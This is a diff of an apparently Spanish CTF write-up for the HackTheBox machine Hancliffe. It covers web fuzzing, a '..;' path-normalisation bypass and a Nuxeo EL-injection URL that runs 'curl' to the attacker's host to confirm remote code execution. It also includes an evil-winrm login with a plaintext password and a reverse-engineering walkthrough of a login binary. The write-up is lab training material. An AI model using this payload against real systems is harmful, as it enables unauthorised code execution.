@@ -129,6 +129,7 @@
         <li><a href="#shell-administrator">Shell - Administrator</a></li>
         <li><a href="#bof-socketreuse">BOF - socket reuse</a></li>
         <li><a href="#bof-egghunter">BOF - egghunter</a></li>
+        <li><a href="#bof-loadlibrary">BOF - loadlibrary</a></li>
         <li><a href="#extra-administrator">Extra - Administrator</a></li>
       </ul>
   </div>
@@ -161,23 +162,18 @@ Password: password
 Username or Password incorrect  </span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Aunque es innecesario por ahora, solo por comodidad agregaremos el dominio <code class="language-plaintext highlighter-rouge">hancliffe.htb</code> al archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code> para que asi sepa a donde debe resolver</p>
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ echo </span><span class="am">"10.10.11.115 hancliffe.htb" </span><span class="p">| </span><span class="ve">sudo tee</span><span class="p"> -a /etc/hosts  </span>
-</code></pre></div></div><br>
-
 <p class="plain-text">En el puerto <code class="language-plaintext highlighter-rouge">8000</code> podemos encontrar un <code class="language-plaintext highlighter-rouge">Password Manager</code> que por ahora no nos sirve de nada y en el <code class="language-plaintext highlighter-rouge">80</code> una pagina por defecto de <code class="language-plaintext highlighter-rouge">nginx</code> sin nada interesante</p>
 <a href="/hackthebox/hancliffe/1.png" target="_blank"><div><p><img src="/hackthebox/hancliffe/1.png"></p></div></a>
 <a href="/hackthebox/hancliffe/2.png" target="_blank"><div><p><img src="/hackthebox/hancliffe/2.png"></p></div></a>
 
 <p class="plain-text">Ya que no hay nada interesante podriamos usar <code class="language-plaintext highlighter-rouge">wfuzz</code> para intentar descubrir directorios bajo el puerto 80, la ruta <code class="language-plaintext highlighter-rouge">/maintenance</code> nos devuelve un <code class="language-plaintext highlighter-rouge">302</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ wfuzz </span><span class="p">-c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://hancliffe.htb/FUZZ -t 100 --hc 404  
+<code><span class="ve">❯ wfuzz </span><span class="p">-c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://10.10.11.115/FUZZ -t 100 --hc 404  
 ********************************************************
 * Wfuzz 3.1.0 - The Web Fuzzer                         *
 ********************************************************
 
-Target: http://hancliffe.htb/FUZZ
+Target: http://10.10.11.115/FUZZ
 Total requests: 30000
 
 =====================================================================
@@ -189,14 +185,14 @@ ID           Response   Lines    Word       Chars       Payload
 
 <p class="plain-text">Si miramos a donde nos redirige nos lleva a <code class="language-plaintext highlighter-rouge">/nuxeo/Maintenance/</code>, si intentamos acceder desde al navegador nos devolvera <code class="language-plaintext highlighter-rouge">404</code> ya que /nuxeo no existe</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ curl</span><span class="p"> -s hancliffe.htb/maintenance -I | </span><span class="ve">grep </span><span class="p">Location  
+<code><span class="ve">❯ curl</span><span class="p"> -s 10.10.11.115/maintenance -I | </span><span class="ve">grep </span><span class="p">Location  
 </span><span class="ro">Location</span><span class="p">: /nuxeo/Maintenance/</span>
 </code></pre></div></div><br>
 <a href="/hackthebox/hancliffe/3.png" target="_blank"><div><p><img src="/hackthebox/hancliffe/3.png"></p></div></a>
 
 <p class="plain-text">Al agregar una / al final devuelve un <code class="language-plaintext highlighter-rouge">200</code> ademas nos setea una cookie para /nuxeo</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ curl </span><span class="p">http://hancliffe.htb/maintenance/ -I
+<code><span class="ve">❯ curl </span><span class="p">http://10.10.11.115/maintenance/ -I
 HTTP/1.1 200 
 Server: nginx/1.21.0
 Date: Sun, 22 Oct 2023 13:43:58 GMT
@@ -215,7 +211,7 @@ Vary: Accept-Encoding</span>
 
 <p class="plain-text">Buscando posibles vulnerabilidades llegamos a un <a href="https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf">pdf</a> con diferentes payloads para romper la logica parser de diferentes lenguajes, podriamos probar <code class="language-plaintext highlighter-rouge">..;</code> ya que esta montado en java y al enviarlo nos redirige a <code class="language-plaintext highlighter-rouge">/nuxeo/nxstartup.faces</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ curl </span><span class="am">'http://hancliffe.htb/maintenance/..;/' </span><span class="p">-b JSESSIONID=466264FD2C98FE4830D890FC850FED8E.nuxeo -I
+<code><span class="ve">❯ curl </span><span class="am">'http://10.10.11.115/maintenance/..;/' </span><span class="p">-b JSESSIONID=466264FD2C98FE4830D890FC850FED8E.nuxeo -I
 HTTP/1.1 302 
 Server: nginx/1.21.0
 Date: Sun, 22 Oct 2023 13:45:06 GMT
@@ -227,13 +223,13 @@ Cache-Control: no-cache, no-store, must-revalidate
 X-Content-Type-Options: nosniff
 Content-Security-Policy: img-src data: blob: *; default-src blob: *; script-src 'unsafe-inline' 'unsafe-eval' data: *; style-src 'unsafe-inline' *; font-src data: *  
 X-XSS-Protection: 1; mode=block
-Location: http://hancliffe.htb/nuxeo/nxstartup.faces
+Location: http://10.10.11.115/nuxeo/nxstartup.faces
 Vary: Accept-Encoding</span>
 </code></pre></div></div><br>
 
 <p class="plain-text">Al acceder al <code class="language-plaintext highlighter-rouge">.faces</code> carga un javascript que nuevamente nos redirige a un <code class="language-plaintext highlighter-rouge">.jsp</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ curl </span><span class="am">'http://hancliffe.htb/maintenance/..;/nuxeo/nxstartup.faces'</span><span class="p"> -b JSESSIONID=466264FD2C98FE4830D890FC850FED8E.nuxeo -i
+<code><span class="ve">❯ curl </span><span class="am">'http://10.10.11.115/maintenance/..;/nuxeo/nxstartup.faces'</span><span class="p"> -b JSESSIONID=466264FD2C98FE4830D890FC850FED8E.nuxeo -i
 HTTP/1.1 401 
 Server: nginx/1.21.0
 Date: Sun, 22 Oct 2023 13:45:42 GMT
@@ -249,7 +245,7 @@ X-XSS-Protection: 1; mode=block
 
 &ltscript type="text/javascript">
 document.cookie = 'nuxeo.start.url.fragment=' + encodeURIComponent(window.location.hash.substring(1) || '') + '; path=/';
-window.location = 'http://hancliffe.htb/nuxeo/login.jsp';
+window.location = 'http://10.10.11.115/nuxeo/login.jsp';
 &lt/script></span>
 </code></pre></div></div><br>
 
@@ -266,7 +262,7 @@ window.location = 'http://hancliffe.htb/nuxeo/login.jsp';
 
 <p class="plain-text">Podemos enviar ahora el <code class="language-plaintext highlighter-rouge">payload</code> que nos permite ejecutar comandos para comprobar y si nos enviamos un <code class="language-plaintext highlighter-rouge">curl</code> recibimos la petición, tenemos RCE</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">http://hancliffe.htb/maintenance/..;/login.jsp/pwn${"".getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("curl 10.10.14.10",null).waitFor()}.xhtml  </span>
+<code><span class="p">http://10.10.11.115/maintenance/..;/login.jsp/pwn${"".getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("curl 10.10.14.10",null).waitFor()}.xhtml  </span>
 </code></pre></div></div><br>
 
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
@@ -409,7 +405,7 @@ PS C:\Users\clara></span>
 
 <p class="plain-text">La nueva contraseña generada es valida en el sistema para el usuaro <code class="language-plaintext highlighter-rouge">development</code>, este usuario puede conectarse a <code class="language-plaintext highlighter-rouge">winrm</code> por lo que podemos ganar una shell</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ proxychains </span><span class="p">-q evil-winrm -i hancliffe.htb -u development -p </span><span class="am">'AMl.q2DHp?2.C/V0kNFU'  </span><span class="p">
+<code><span class="ve">❯ proxychains </span><span class="p">-q evil-winrm -i 10.10.11.115 -u development -p </span><span class="am">'AMl.q2DHp?2.C/V0kNFU'  </span><span class="p">
 PS C:\Users\development\Documents> </span><span class="am">whoami</span><span class="p">
 hancliffe\development
 PS C:\Users\development\Documents></span>
@@ -450,308 +446,79 @@ Info: Download successful!
 PS C:\DevApp></span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Iniciemos analizando el binario, para ello podemos usar un decompilador como <code class="language-plaintext highlighter-rouge">ida</code> y asi ver su codigo, al hacerlo nos podemos encontrar funciones como <code class="language-plaintext highlighter-rouge">main</code></p>
+<p class="plain-text">Iniciemos analizando el binario, para ello podemos usar un desensamblador como <code class="language-plaintext highlighter-rouge">ida</code>, la función <code class="language-plaintext highlighter-rouge">main</code> inicia llamando a <code class="language-plaintext highlighter-rouge">WSAStartup</code> que inicia el uso del archivo dll de <code class="language-plaintext highlighter-rouge">Winsock</code>, luego llama a <code class="language-plaintext highlighter-rouge">getaddrinfo</code> estableciendo los datos de esta estructura</p>
 <a href="/hackthebox/hancliffe/7.png" target="_blank"><div><p><img src="/hackthebox/hancliffe/7.png"></p></div></a>
 
-<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">main()</code> se encarga de elegir un numero para el <code class="language-plaintext highlighter-rouge">puerto</code> aleatorio elegido por el tiempo actual e iniciar el socket, una vez iniciado llama a <code class="language-plaintext highlighter-rouge">ConnectionHandler</code></p>
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="no">int </span><span class="p">__cdecl </span><span class="na">main</span><span class="p">(</span><span class="no">int </span><span class="am">argc</span><span class="p">, </span><span class="o">const </span><span class="no">char </span><span class="o">**</span><span class="am">argv</span><span class="p">, </span><span class="o">const </span><span class="no">char </span><span class="o">**</span><span class="am">envp</span><span class="p">)
-{
-  </span><span class="no">int </span><span class="p">socket_error; </span><span class="c1">// eax
-  </span><span class="no">unsigned int </span><span class="p">_time; </span><span class="c1">// eax
-  </span><span class="na">u_short </span><span class="p">random_port; </span><span class="c1">// ax
-  </span><span class="no">int </span><span class="p">setsockopt_error; </span><span class="c1">// eax
-  </span><span class="no">int </span><span class="p">bind_error; </span><span class="c1">// eax
-  </span><span class="no">int </span><span class="p">listen_error; </span><span class="c1">// eax
-  </span><span class="no">int </span><span class="p">accept_error; </span><span class="c1">// eax
-  </span><span class="no">char </span><span class="p">optval[</span><span class="mi">4</span><span class="p">]; </span><span class="c1">// [esp+28h] [ebp-1F0h] BYREF
-  </span><span class="no">int </span><span class="p">addrlen; </span><span class="c1">// [esp+2Ch] [ebp-1ECh] BYREF
-  </span><span class="no">struct </span><span class="p">sockaddr addr; </span><span class="c1">// [esp+30h] [ebp-1E8h] BYREF
-  </span><span class="p">PADDRINFOA addrinfo_result; </span><span class="c1">// [esp+40h] [ebp-1D8h] BYREF
-  </span><span class="p">ADDRINFOA addrinfo_hints; </span><span class="c1">// [esp+44h] [ebp-1D4h] BYREF
-  </span><span class="no">struct </span><span class="p">WSAData WSAData; </span><span class="c1">// [esp+64h] [ebp-1B4h] BYREF
-  </span><span class="no">int </span><span class="p">port; </span><span class="c1">// [esp+1F4h] [ebp-24h]
-  </span><span class="no">struct </span><span class="p">sockaddr </span><span class="o">*</span><span class="p">ai_addr; </span><span class="c1">// [esp+1F8h] [ebp-20h]
-  </span><span class="no">int </span><span class="p">random; </span><span class="c1">// [esp+1FCh] [ebp-1Ch]
-  </span><span class="p">SOCKET server_socket; </span><span class="c1">// [esp+200h] [ebp-18h]
-  </span><span class="na">INT </span><span class="p">error_code; </span><span class="c1">// [esp+204h] [ebp-14h]
-  </span><span class="no">int </span><span class="p">optlen; </span><span class="c1">// [esp+208h] [ebp-10h]
-  </span><span class="p">SOCKET s_socket; </span><span class="c1">// [esp+20Ch] [ebp-Ch]
+<p class="plain-text">Luego llama a <code class="language-plaintext highlighter-rouge">socket</code> que crea un nuevo socket y guarda el descriptor en una variable <code class="language-plaintext highlighter-rouge">s</code>, si esta es igual a <code class="language-plaintext highlighter-rouge">-1</code> lanza un error de lo contrario sigue la flecha verde</p>
+<a href="/hackthebox/hancliffe/8.png" target="_blank"><div><p><img src="/hackthebox/hancliffe/8.png"></p></div></a>
 
- </span><span class="p">__main();
-  s_socket </span><span class="o">= -</span><span class="mi">1</span><span class="p">;
-  WSAStartup(</span><span class="mi">0x202</span><span class="no">u</span><span class="p">, </span><span class="o">&</span><span class="p">WSAData);
-  </span><span class="no">memset</span><span class="p">(</span><span class="o">&</span><span class="p">addrinfo_hints, </span><span class="mi">0</span><span class="p">, </span><span class="o">sizeof</span><span class="p">(addrinfo_hints));
-  addrinfo_hints.ai_family </span><span class="o">= </span><span class="mi">2</span><span class="p">;
-  addrinfo_hints.ai_socktype </span><span class="o">= </span><span class="mi">1</span><span class="p">;
-  addrinfo_hints.ai_protocol </span><span class="o">= </span><span class="mi">6</span><span class="p">;
-  addrinfo_hints.ai_flags </span><span class="o">= </span><span class="mi">1</span><span class="p">;
-  addrlen </span><span class="o">= </span><span class="mi">16</span><span class="p">;
-  </span><span class="o">*</span><span class="p">optval </span><span class="o">= </span><span class="mi">1</span><span class="p">;
-  optlen </span><span class="o">= </span><span class="mi">4</span><span class="p">;
-  error_code </span><span class="o">= </span><span class="p">getaddrinfo(</span><span class="mi">0</span><span class="p">,</span><span class="s"> "9999"</span><span class="p">,</span><span class="o"> &</span><span class="p">addrinfo_hints, </span><span class="o">&</span><span class="p">addrinfo_result);
-  </span><span class="o">if </span><span class="p">( error_code )
-  {
-    </span><span class="no">printf</span><span class="p">(</span><span class="s">"getaddrinfo failed with error: </span><span class="mi">%d\n</span><span class="s">"</span><span class="p">, error_code);
-    WSACleanup();
-    </span><span class="o">return </span><span class="mi">1</span><span class="p">;
-  }
-  </span><span class="o">else</span><span class="p">
-  {
-    server_socket </span><span class="o">= </span><span class="p">socket(addrinfo_result->ai_family, addrinfo_result->ai_socktype, addrinfo_result->ai_protocol);  
-    </span><span class="o">if</span><span class="p"> ( server_socket </span><span class="o">== -</span><span class="mi">1</span><span class="p"> )
-    {
-      socket_error </span><span class="o">= </span><span class="p">WSAGetLastError();
-      </span><span class="no">printf</span><span class="p">(</span><span class="s">"socket failed with error: </span><span class="mi">%ld\n</span><span class="s">"</span><span class="p">, socket_error);
-      freeaddrinfo(addrinfo_result);
-      WSACleanup();
-      </span><span class="o">return </span><span class="mi">1</span><span class="p">;
-    }
-    </span><span class="o">else</span><span class="p">
-    {
-      _time </span><span class="o">= </span><span class="no">time</span><span class="p">(</span><span class="mi">0</span><span class="p">);
-      </span><span class="no">srand</span><span class="p">(_time);
-      random </span><span class="o">= </span><span class="no">rand</span><span class="p">();
-      ai_addr </span><span class="o">= </span><span class="p">addrinfo_result->ai_addr;
-      port </span><span class="o">= </span><span class="p">random </span><span class="o">% </span><span class="mi">1000 </span><span class="o">+ </span><span class="mi">9000</span><span class="p">;
-      random_port </span><span class="o">= </span><span class="p">htons(random </span><span class="o">% </span><span class="mi">1000 </span><span class="o">+ </span><span class="mi">9000</span><span class="p">);
-      </span><span class="o">*</span><span class="p">ai_addr->sa_data </span><span class="o">= </span><span class="p">random_port;
-      </span><span class="no">printf</span><span class="p">(</span><span class="s">"Server Started on Port </span><span class="mi">%d\r\n</span><span class="s">"</span><span class="p">, port);
-      error_code </span><span class="o">= </span><span class="p">setsockopt(server_socket, </span><span class="mi">0xFFFF</span><span class="p">, </span><span class="mi">4</span><span class="p">, optval, optlen);
-      </span><span class="o">if</span><span class="p"> ( error_code </span><span class="o">== -</span><span class="mi">1 </span><span class="p">)
-      {
-        setsockopt_error </span><span class="o">= </span><span class="p">WSAGetLastError();
-        </span><span class="no">printf</span><span class="p">(</span><span class="s">"setsockopt failed with error: </span><span class="mi">%d\n</span><span class="s">"</span><span class="p">, setsockopt_error);
-      }
-      error_code </span><span class="o">= </span><span class="p">bind(server_socket, addrinfo_result->ai_addr, addrinfo_result->ai_addrlen);
-      </span><span class="o">if</span><span class="p"> ( error_code </span><span class="o">== -</span><span class="mi">1</span><span class="p"> )
-      {
-        bind_error </span><span class="o">= </span><span class="p">WSAGetLastError();
-        </span><span class="no">printf</span><span class="p">(</span><span class="s">"bind failed with error: </span><span class="mi">%d\n</span><span class="s">"</span><span class="p">, bind_error);
-        freeaddrinfo(addrinfo_result);
-        closesocket(server_socket);
-        WSACleanup();
-        </span><span class="o">return </span><span class="mi">1</span><span class="p">;
-      }
-      </span><span class="o">else</span><span class="p">
-      {
-        </span><span class="no">puts</span><span class="p">(</span><span class="s">"Waiting Connection</span><span class="mi">\r</span><span class="s">"</span><span class="p">);
-        error_code </span><span class="o">= </span><span class="p">listen(server_socket, </span><span class="mi">0x7FFFFFFF</span><span class="p">);
-        </span><span class="o">if</span><span class="p"> ( error_code </span><span class="o">== -</span><span class="mi">1</span><span class="p"> )
-        {
-          listen_error </span><span class="o">= </span><span class="p">WSAGetLastError();
-          </span><span class="no">printf</span><span class="p">(</span><span class="s">"listen failed with error: </span><span class="mi">%d\n</span><span class="s">"</span><span class="p">, listen_error);
-          closesocket(server_socket);
-          WSACleanup();
-          </span><span class="o">return </span><span class="mi">1</span><span class="p">;
-        }
-        </span><span class="o">else</span><span class="p">
-        {
-          </span><span class="o">while</span><span class="p"> ( server_socket )
-          {
-            s_socket </span><span class="o">= </span><span class="p">accept(server_socket, </span><span class="o">&</span><span class="p">addr, </span><span class="o">&</span><span class="p">addrlen);
-            </span><span class="o">if</span><span class="p"> ( s_socket </span><span class="o">== -</span><span class="mi">1</span><span class="p"> )
-            {
-              accept_error </span><span class="o">= </span><span class="p">WSAGetLastError();
-              </span><span class="no">printf</span><span class="p">(</span><span class="s">"Accept failed with error: </span><span class="mi">%d\n</span><span class="s">"</span><span class="p">, accept_error);
-              closesocket(server_socket);
-              WSACleanup();
-              </span><span class="o">return </span><span class="mi">1</span><span class="p">;
-            }
-            </span><span class="no">puts</span><span class="p">(</span><span class="s">"Connection Received</span><span class="mi">\r</span><span class="s">"</span><span class="p">);
-            _IAT_start__(</span><span class="mi">0</span><span class="p">, </span><span class="mi">0</span><span class="p">, ConnectionHandler, s_socket, </span><span class="mi">0</span><span class="p">, </span><span class="mi">0</span><span class="p">);
-          }
-          closesocket(</span><span class="mi">0</span><span class="p">);
-          WSACleanup();
-          </span><span class="o">return </span><span class="mi">0</span><span class="p">;
-        }
-      }
-    }
-  }
-}</span>
+<p class="plain-text">Ahora usando <code class="language-plaintext highlighter-rouge">srand</code> y <code class="language-plaintext highlighter-rouge">rand</code> basandose en el tiempo usando la función <code class="language-plaintext highlighter-rouge">time</code> crea un numero de puerto aleatorio entre <code class="language-plaintext highlighter-rouge">9000</code> y <code class="language-plaintext highlighter-rouge">9999</code>, luego utiliza <code class="language-plaintext highlighter-rouge">htons</code> para darle el formato de puerto, lo asigna a la estructura y muestra este puerto con <code class="language-plaintext highlighter-rouge">printf</code></p>
+<a href="/hackthebox/hancliffe/9.png" target="_blank"><div><p><img src="/hackthebox/hancliffe/9.png"></p></div></a>
+
+<p class="plain-text">Luego llama a <code class="language-plaintext highlighter-rouge">bind</code> para vincular el socket a la dirección obtenida y a <code class="language-plaintext highlighter-rouge">listen</code> para ponerse en escucha de nuevas conexiones utilizando ese puerto aleatorio</p>
+<a href="/hackthebox/hancliffe/10.png" target="_blank"><div><p><img src="/hackthebox/hancliffe/10.png"></p></div></a>
+
+<p class="plain-text">Si se recibe una conexión la acepta utilizando <code class="language-plaintext highlighter-rouge">accept</code> que devuelve un nuevo descriptor, muestra un mensaje que recibió una conexión y crea un nuevo hilo llamando a la función <code class="language-plaintext highlighter-rouge">cHandler</code> que se encarga de controlar las conexiones</p>
+<a href="/hackthebox/hancliffe/11.png" target="_blank"><div><p><img src="/hackthebox/hancliffe/11.png"></p></div></a>
+
+<p class="plain-text">La función cHandler inicia reservando espacios de memoria de <code class="language-plaintext highlighter-rouge">0x400</code> o <code class="language-plaintext highlighter-rouge">1024</code> bytes, luego con <code class="language-plaintext highlighter-rouge">send</code> envia un mesnaje de bienvenida, siguiendo la linea verde compara el nuevo descriptor con <code class="language-plaintext highlighter-rouge">0</code>, esto con el fin de comprobar que tenga asignado un valor</p>
+<a href="/hackthebox/hancliffe/12.png" target="_blank"><div><p><img src="/hackthebox/hancliffe/12.png"></p></div></a>
+
+<p class="plain-text">Luego mueve a <code class="language-plaintext highlighter-rouge">auth</code> el valor <code class="language-plaintext highlighter-rouge">0</code>, luego con <code class="language-plaintext highlighter-rouge">send</code> muestra un mensaje que pide un usuario para luego recibir un buffer que copia a la variable <code class="language-plaintext highlighter-rouge">username</code> con <code class="language-plaintext highlighter-rouge">strncpy</code></p>
+<a href="/hackthebox/hancliffe/13.png" target="_blank"><div><p><img src="/hackthebox/hancliffe/13.png"></p></div></a>
+
+<p class="plain-text">Repite este mismo proceso pero para la variable <code class="language-plaintext highlighter-rouge">password</code>, en resumen recibe un usuario y una contraseña, una vez recibió ambos llama a la función <code class="language-plaintext highlighter-rouge">login</code> pasandoselos como argumentos y hace un salto condicional con el resultado</p>
+<a href="/hackthebox/hancliffe/14.png" target="_blank"><div><p><img src="/hackthebox/hancliffe/14.png"></p></div></a>
+
+<p class="plain-text">Inicia definiendo como usuario la string <code class="language-plaintext highlighter-rouge">alfiansyah</code>, y como contraseña una cadena que parece ser <code class="language-plaintext highlighter-rouge">base64</code>, luego le pasa el segundo parametro como argumento a <code class="language-plaintext highlighter-rouge">encrypt1</code> y el valor que esta función devuelve lo pasa a <code class="language-plaintext highlighter-rouge">encrypt2</code>, mide la longitud, cifra la cadena en <code class="language-plaintext highlighter-rouge">base64</code> y lo compara con la cadena en <code class="language-plaintext highlighter-rouge">base64</code> que define al inicio</p>
+<a href="/hackthebox/hancliffe/15.png" target="_blank"><div><p><img src="/hackthebox/hancliffe/15.png"></p></div></a>
+
+<p class="plain-text">Si la contraseña que recibe como argumento al cifrarse es igual a la cadena en <code class="language-plaintext highlighter-rouge">base64</code> definida al inicio devuelve <code class="language-plaintext highlighter-rouge">true</code>, de lo contrario simplemente un <code class="language-plaintext highlighter-rouge">false</code></p>
+<a href="/hackthebox/hancliffe/16.png" target="_blank"><div><p><img src="/hackthebox/hancliffe/16.png"></p></div></a>
+
+<p class="plain-text">Analicemos <code class="language-plaintext highlighter-rouge">encrypt1</code>, inicia llamando a <code class="language-plaintext highlighter-rouge">strdup</code> con el argumento para duplicarlo en <code class="language-plaintext highlighter-rouge">password</code>, luego se inicia una variable <code class="language-plaintext highlighter-rouge">c</code> a <code class="language-plaintext highlighter-rouge">0</code> que servira como contador, compara que no sea mayor que la longitud de la cadena y si no es asi compara el byte actual sea mayor que <code class="language-plaintext highlighter-rouge">0x20</code> asegurandose que sea un caracter <code class="language-plaintext highlighter-rouge">ascii</code> y no menor</p>
+<a href="/hackthebox/hancliffe/17.png" target="_blank"><div><p><img src="/hackthebox/hancliffe/17.png"></p></div></a>
+
+<p class="plain-text">Luego compara el que el byte sea menor que <code class="language-plaintext highlighter-rouge">0x7f</code> ya que es el valor máximo de caractéres <code class="language-plaintext highlighter-rouge">ascii</code>, si es un caracter válido mueve su valor a <code class="language-plaintext highlighter-rouge">eax</code> y le suma <code class="language-plaintext highlighter-rouge">47</code> con <code class="language-plaintext highlighter-rouge">add</code>, si el resultado de esta operación es menor que <code class="language-plaintext highlighter-rouge">0x7f</code> mueve el caracter sin cambios pero si es mayor que <code class="language-plaintext highlighter-rouge">0x7e</code> resta <code class="language-plaintext highlighter-rouge">0x5e</code>, esto es un cifrado muy conocido llamado <a href="https://es.wikipedia.org/wiki/ROT13#Implementaci%C3%B3n_en_VB_de_ROT47">rot47</a>, ahora que sabemos la operación podemos realizarla a la inversa</p>
+
+<a href="/hackthebox/hancliffe/18.png" target="_blank"><div><p><img src="/hackthebox/hancliffe/18.png"></p></div></a>
+
+<p class="plain-text">Vamos con <code class="language-plaintext highlighter-rouge">encrypt2</code>, este inicia duplicando el argumento a password con <code class="language-plaintext highlighter-rouge">strdup</code>, inicializa <code class="language-plaintext highlighter-rouge">c</code> a <code class="language-plaintext highlighter-rouge">0</code> como contador, luego compara que no sea mas grande que la longitud que la string, mueve el byte actual a <code class="language-plaintext highlighter-rouge">eax</code> y compara si es mayor que <code class="language-plaintext highlighter-rouge">0x40</code> osea que sea igual o mayor a <code class="language-plaintext highlighter-rouge">0x41</code> que en representación ascii es <code class="language-plaintext highlighter-rouge">A</code> o mayor</p>
+<a href="/hackthebox/hancliffe/19.png" target="_blank"><div><p><img src="/hackthebox/hancliffe/19.png"></p></div></a>
+
+<p class="plain-text">Tambien compara que sea igual o menor que <code class="language-plaintext highlighter-rouge">0x5a</code> que en ascii es <code class="language-plaintext highlighter-rouge">Z</code>, realiza la misma comparación con <code class="language-plaintext highlighter-rouge">a</code> y <code class="language-plaintext highlighter-rouge">z</code> minuscula por lo que podriamos tomarlo como un <code class="language-plaintext highlighter-rouge">if</code> que compara que el byte esté entre <code class="language-plaintext highlighter-rouge">A-Z</code> o <code class="language-plaintext highlighter-rouge">a-z</code>, luego compara si el caracter es mayuscula o minuscula, dependiendo del resultado de la un valor a la variable <code class="language-plaintext highlighter-rouge">uppercase</code>, en el caso de que sea mayuscula la convierte a minuscula agregando <code class="language-plaintext highlighter-rouge">0x20</code>, podemos ver su funcionamiento bastante resumido en python con <code class="language-plaintext highlighter-rouge">ord</code> y <code class="language-plaintext highlighter-rouge">chr</code></p>
+<a href="/hackthebox/hancliffe/20.png" target="_blank"><div><p><img src="/hackthebox/hancliffe/20.png"></p></div></a>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3</span><span class="p"> -q
+>>> chr(ord("A") + 0x20)  
+'a'
+>>></span>
 </code></pre></div></div><br>
 
-<p class="plain-text">La <code class="language-plaintext highlighter-rouge">funcion</code> encargada de la conexión es la siguiente, en ella podemos encotrar algunos valores como <code class="language-plaintext highlighter-rouge">FullName</code> o <code class="language-plaintext highlighter-rouge">Code</code> en texto plano, lo mas interesante de ella es que llama a la funcion <code class="language-plaintext highlighter-rouge">login()</code> para obtener la comparacion de las credenciales</p>
+<p class="plain-text">Ahora mueve el caracter ya en minuscula a <code class="language-plaintext highlighter-rouge">eax</code> y le resta <code class="language-plaintext highlighter-rouge">0x61</code>, luego mueve a <code class="language-plaintext highlighter-rouge">ecx</code> <code class="language-plaintext highlighter-rouge">0x7a</code> y le resta el valor en <code class="language-plaintext highlighter-rouge">eax</code>, por lo que podriamos describirlo como <code class="language-plaintext highlighter-rouge">0x7a - (character - 0x61)</code>, esto si lo vemos en python convierte la <code class="language-plaintext highlighter-rouge">a</code> en <code class="language-plaintext highlighter-rouge">z</code>, la <code class="language-plaintext highlighter-rouge">b</code> en <code class="language-plaintext highlighter-rouge">y</code>, la <code class="language-plaintext highlighter-rouge">c</code> en <code class="language-plaintext highlighter-rouge">x</code>, esto se llama cifrado espejo o <a href="https://es.wikipedia.org/wiki/Atbash">atbash</a>, ya tenemos todoss los cifrados</p>
+<a href="/hackthebox/hancliffe/21.png" target="_blank"><div><p><img src="/hackthebox/hancliffe/21.png"></p></div></a>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="no">int </span><span class="p">__stdcall </span><span class="na">ConnectionHandler</span><span class="p">(SOCKET </span><span class="am">param_1</span><span class="p">)
-{
-  </span><span class="no">int </span><span class="p">result; </span><span class="c1">// eax
-  </span><span class="no">int </span><span class="p">Error; </span><span class="c1">// eax
-  </span><span class="no">int </span><span class="p">recv_error; </span><span class="c1">// eax
-  </span><span class="no">char </span><span class="p">password[</span><span class="mi">17</span><span class="p">];</span><span class="c1"> // [esp+19h] [ebp-3Fh] BYREF
-  </span><span class="no">char </span><span class="p">username[</span><span class="mi">10</span><span class="p">];</span><span class="c1"> // [esp+2Ah] [ebp-2Eh] BYREF
-  </span><span class="no">int </span><span class="p">recv_name; </span><span class="c1">// [esp+34h] [ebp-24h]
-  </span><span class="no">char </span><span class="o">*</span><span class="p">fullname; </span><span class="c1">// [esp+38h] [ebp-20h]
-  </span><span class="no">char </span><span class="o">*</span><span class="p">code; </span><span class="c1">// [esp+3Ch] [ebp-1Ch]
-  </span><span class="na">BOOL </span><span class="p">auth; </span><span class="c1">// [esp+40h] [ebp-18h]
-  </span><span class="no">int </span><span class="p">v10; </span><span class="c1">// [esp+44h] [ebp-14h]
-  </span><span class="p">SOCKET server_socket; </span><span class="c1">// [esp+48h] [ebp-10h]
-  </span><span class="no">char </span><span class="o">*</span><span class="p">buffer; </span><span class="c1">// [esp+4Ch] [ebp-Ch]
-
-  </span><span class="no">puts</span><span class="p">(</span><span class="s">"thread cretead</span><span class="mi">\r</span><span class="s">"</span><span class="p">);
-  buffer </span><span class="o">= </span><span class="no">malloc</span><span class="p">(</span><span class="mi">0x400</span><span class="no">u</span><span class="p">);
-  server_socket </span><span class="o">= </span><span class="p">param_1;
-  </span><span class="no">memset</span><span class="p">(buffer, </span><span class="o">0</span><span class="p">, </span><span class="mi">0x400</span><span class="no">u</span><span class="p">);
-  result </span><span class="o">= </span><span class="p">send(param_1, </span><span class="s">"Welcome Brankas Application.</span><span class="mi">\n</span><span class="s">"</span><span class="p">, </span><span class="mi">29</span><span class="p">, </span><span class="mi">0</span><span class="p">);
-  v10 </span><span class="o">= </span><span class="p">result;
-  </span><span class="o">if</span><span class="p"> ( result </span><span class="o">== -</span><span class="mi">1</span><span class="p"> )
-  {
-    Error </span><span class="o">= </span><span class="p">WSAGetLastError();
